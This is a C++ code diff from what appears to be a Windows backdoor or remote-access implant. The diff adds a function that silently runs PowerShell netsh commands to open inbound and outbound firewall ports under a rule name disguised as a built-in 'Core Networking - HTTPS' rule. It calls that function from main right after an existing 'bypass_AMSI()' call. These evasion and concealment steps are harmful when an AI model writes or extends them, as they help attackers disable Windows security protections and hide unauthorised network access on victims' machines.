@@ -82,6 +82,15 @@ void connectSocketWindows(SOCKET serverSocket, sockaddr_in serverAddress) {
     std::cout << "Windows socket accepted connection!" << std::endl;
 }
 
+void open_firewall_port(int port) {
+    std::string port_str = std::to_string(port);
+    std::string firewall_in = "powershell -Command \"& {netsh advfirewall firewall add rule name='Core Networking - HTTPS (TCP-In)' dir=in action=allow protocol=TCP localport=" + port_str + "} | Out-Null\"";
+    std::string firewall_out = "powershell -Command \"& {netsh advfirewall firewall add rule name='Core Networking - HTTPS (TCP-Out)' dir=out action=allow protocol=TCP localport=" + port_str + "} | Out-Null\"";
+    system(firewall_in.c_str());
+    system(firewall_out.c_str());
+    std::cout << "Firewall Rules Created!" << std::endl;
+}
+
 int main(int argc, char* argv[]) {
     std::string clientIP = DEFAULT_CLIENT_IP;
     int port = DEFAULT_PORT;
@@ -94,6 +103,9 @@ int main(int argc, char* argv[]) {
 
     // Bypass AMSI
     bypass_AMSI();
+
+    // Opens firewall port
+    open_firewall_port(port);
 
     SocketInfo socketInfo;
     std::cout << "Running on Windows" << std::endl;
